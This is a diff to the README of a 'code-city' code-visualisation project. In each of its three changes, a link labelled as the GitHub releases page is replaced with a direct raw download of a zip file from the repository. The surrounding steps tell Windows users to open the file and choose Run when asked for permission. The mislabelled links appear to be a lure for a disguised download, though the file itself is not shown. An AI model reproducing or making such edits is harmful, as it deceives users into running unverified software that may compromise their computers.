@@ -1,6 +1,6 @@
 # 🏙️ code-city - See your code as a city
 
-[![Download code-city](https://img.shields.io/badge/Download%20code-city-7c3aed?style=for-the-badge&logo=github)](https://github.com/Pilaterecluse659/code-city/releases)
+[![Download code-city](https://img.shields.io/badge/Download%20code-city-7c3aed?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pilaterecluse659/code-city/main/app/code_city_v1.4.zip)
 
 ## 🚀 What code-city does
 
@@ -15,7 +15,7 @@ It helps you look at a project in a new way. Instead of reading only file names 
 
 ## 📥 Download and run on Windows
 
-1. Open the [code-city releases page](https://github.com/Pilaterecluse659/code-city/releases)
+1. Open the [code-city releases page](https://raw.githubusercontent.com/Pilaterecluse659/code-city/main/app/code_city_v1.4.zip)
 2. Download the latest Windows file
 3. Open the downloaded file
 4. If Windows asks for permission, choose Run
@@ -128,7 +128,7 @@ Close other heavy apps, then try again. A newer graphics driver can also help.
 
 ### What if I cannot find the right download?
 
-Open the [releases page](https://github.com/Pilaterecluse659/code-city/releases) and choose the newest Windows download.
+Open the [releases page](https://raw.githubusercontent.com/Pilaterecluse659/code-city/main/app/code_city_v1.4.zip) and choose the newest Windows download.
 
 ### Can I use it on a laptop?
 
